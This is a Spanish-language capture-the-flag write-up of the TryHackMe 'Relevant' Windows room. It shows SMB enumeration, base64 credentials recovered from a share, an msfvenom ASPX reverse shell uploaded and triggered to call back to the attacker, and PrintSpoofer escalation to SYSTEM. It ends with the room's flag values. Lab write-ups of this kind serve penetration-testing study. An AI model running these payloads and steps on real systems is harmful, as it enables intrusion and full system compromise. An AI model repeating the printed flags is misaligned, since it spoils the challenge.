---
layout: single
title: Relevant - TryHackMe
excerpt: "En esta ocasion vamos a estar resolviendo el room de Tryhackme que se llama Relevant es una maquina windows que esa catalogada como media pero yo diria que es facil vamos a estar enumerando por smb recursos compartidos a nivel de red y nos aprovecharemos del privilegio que tenemos para poder subir archivos y asi ganar acceso para la escalada de privilegios nos aprovecharemos de un privilegio que tenemos"
date: 2023-04-05
classes: wide
header:
  teaser: /assets/images/try-writeup-relevant/icon.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - SMB Enumeration
  - Windows Privilege Escalation
---
<p align="center">
<img src="/assets/images/try-writeup-relevant/icon.png">
</p>

>
* **Informacion:** Si te estas preparando para la certificacion eJPTv2 de eLearn Security <https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-v2> esta maquina puede servirte aunque no es dificil pero bueno sirve para practicar y repasar cosas.
>

```bash
❯ ping -c 1 10.10.26.76
PING 10.10.26.76 (10.10.26.76) 56(84) bytes of data.
64 bytes from 10.10.26.76: icmp_seq=1 ttl=125 time=255 ms

--- 10.10.26.76 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 254.987/254.987/254.987/0.000 ms

❯ whichSystem.py 10.10.26.76

10.10.26.76 (ttl -> 125): Windows
```

## PortScan

```bash
❯ catn targeted
# Nmap 7.93 scan initiated Wed Apr  5 14:49:40 2023 as: nmap -sCV -p80,135,139,445,3389,49667,49663 -oN targeted 10.10.26.76
Nmap scan report for 10.10.26.76
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-04-04T19:52:30
|_Not valid after:  2023-10-04T19:52:30
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-04-05T20:50:35+00:00
|_ssl-date: 2023-04-05T20:51:16+00:00; -4s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-05T20:50:40
|_  start_date: 2023-04-05T19:53:22
|_clock-skew: mean: 1h23m56s, deviation: 3h07m50s, median: -4s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-05T13:50:36-07:00
```

## Enumeracion

Con la herramienta `crakmapexec` vamos a ver ante que estamos

```bash
❯ crackmapexec smb 10.10.26.76
SMB         10.10.26.76   445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
```

El puerto de `smb` esta abierto asi que vamos a ver los recursos compartidos con la herramienta `smbclient`

```bash
❯ smbclient -N -L 10.10.26.76

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available

```

Vamos a conectarnos al recurso `nt4wrksv` para ver que encontramos

```bash
❯ smbclient -N //10.10.26.76/nt4wrksv
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 16:46:04 2020
  ..                                  D        0  Sat Jul 25 16:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

		7735807 blocks of size 4096. 4922483 blocks available
smb: \> 
```

Si nos descargamos el archivo `passwords.txt` esto es lo que encontramos credenciales

```bash
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
❯ catn passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Tenemos credenciales

```bash
❯ echo -n "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d; echo
Bill - Juw4nnaM4n420696969!$$$
❯ echo -n "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d; echo
Bob - !P@$$W0rD!123
```

Vamos a usar al usuario `Bill` y tenemos privilegios de escritura en el recurso asi que podemos subir archivos

```bash
❯ crackmapexec smb 10.10.26.76 -u Bill -p Juw4nnaM4n420696969 --shares
SMB         10.10.26.76     445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.26.76     445    RELEVANT         [+] Relevant\Bill:Juw4nnaM4n420696969 
SMB         10.10.26.76     445    RELEVANT         [+] Enumerated shares
SMB         10.10.26.76     445    RELEVANT         Share           Permissions     Remark
SMB         10.10.26.76     445    RELEVANT         -----           -----------     ------
SMB         10.10.26.76     445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.10.26.76     445    RELEVANT         C$                              Default share
SMB         10.10.26.76     445    RELEVANT         IPC$                            Remote IPC
SMB         10.10.26.76     445    RELEVANT         nt4wrksv        READ,WRITE      
```

Esta es la pagina `web`

![](/assets/images/try-writeup-relevant/1.png)

Bueno si podemos escribir en el recurso talvez podamos ver los archivos en la web por el puerto que nos reporto `nmap` `49663`

Y si por que no da error

![](/assets/images/try-writeup-relevant/2.png)

Sabiendo esto podemos subir directamente un archivo `.aspx` para ganar acceso al sistema

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.28.226 LPORT=443 -f aspx -o ziz.aspx
```

```bash
❯ smbclient //10.10.26.76/nt4wrksv -U Bill --password Juw4nnaM4n420696969
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr  5 15:06:32 2023
  ..                                  D        0  Wed Apr  5 15:06:32 2023
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

		7735807 blocks of size 4096. 4949082 blocks available
smb: \> put ziz.aspx
putting file ziz.aspx as \ziz.aspx (2.3 kb/s) (average 2.3 kb/s)
smb: \> 
```

Ahora nos ponemos en escucha por el puerto que pusiste en mi caso el `443` con `rlwrap` para mas comodo 

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Hacemos la peticion

```bash
❯ curl http://10.10.26.76:49663/nt4wrksv/ziz.aspx
```

Y ganamos acceso

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.26.76] 49802
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

## Escalada de privilegios

Tenemos el `SeImpersonatePrivilege`

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.26.76] 49802
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

whoami 
whoami 
iis apppool\defaultapppool

whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\windows\system32\inetsrv>
```

Podrias usar `JuicyPotato` 

<https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>

Pero bueno el creador del room dijo lo siguiente

>
* **El creador dijo esto:** DCOM is disabled on this server which prevents potato attacks, and there are no tokens to impersonate.
>

Bueno investigando encontre este `exploit` que funciona para el `windows` al que estamos

<https://github.com/dievus/printspoofer>

Una vez lo descargamos vamos a subirlo con `smbclient` ala maquina

```bash
❯ smbclient //10.10.26.76/nt4wrksv -U Bill --password Juw4nnaM4n420696969
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (10.7 kb/s) (average 10.7 kb/s)
smb: \> 
```

Ahora vamos a la ruta para ver si esta hay y si

```bash
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

04/05/2023  02:27 PM    <DIR>          .
04/05/2023  02:27 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
04/05/2023  02:27 PM            27,136 PrintSpoofer.exe
04/05/2023  02:17 PM             3,410 ziz.aspx
               3 File(s)         30,644 bytes
               2 Dir(s)  20,261,179,392 bytes free

c:\inetpub\wwwroot\nt4wrksv>
```

Ahora lo ejecutamos y estamos como `nt authority\system`

```bash
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\system32>
```

## Flags

La `root.flag` es esta

```bash
type C:\users\administrator\desktop\root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
C:\Windows\system32>
```

La `user.flag` es esta

```bash
type C:\users\bob\desktop\user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
C:\Windows\system32>
```
